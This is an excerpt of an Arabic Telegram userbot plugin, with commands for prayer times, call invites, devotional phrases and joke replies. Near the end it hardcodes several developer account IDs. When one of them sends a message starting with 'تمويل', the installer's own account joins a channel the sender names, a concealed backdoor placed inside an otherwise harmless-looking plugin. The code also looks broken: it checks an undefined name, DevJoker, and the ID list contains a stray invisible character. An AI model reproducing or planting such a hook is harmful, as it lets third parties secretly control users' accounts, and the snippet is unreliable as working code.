...
async def fetch_prayer_times():
    ...
    times_json = await Alosma.download_file(file_location)
    return times_json
...
async def send_prayer_times(event):
    ...
    input_file = await Alosma.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
    await Alosma.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)

@Alosma.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
async def handle_command(event):
    await send_prayer_times(event)

@Alosma.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
...
@Alosma.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
...
R = [
    ...
    "**-** قناة السورس **⪼ [𐇮 الفينوس ](t.me/xxx_Venus)   "
]

@Alosma.on(admin_cmd(pattern="بلي$"))
...
@Alosma.on(admin_cmd(pattern="اذكار$"))
async def ithker(knopis):
...
@Alosma.on(admin_cmd(pattern="كت$"))
async def ithker(knopis):
...
@Alosma.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(Qrue_5erok))

    
@Alosma.on(admin_cmd(pattern="اذكار عشر$"))    
...
@Alosma.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
...
@Alosma.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
    await knopis.edit(choice(Qrue_Bosa))

DevVenus = [6330221767,‏6801329147,5835316914,6528926431]
...
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                await Alosma(JoinChannelRequest(channel_username))
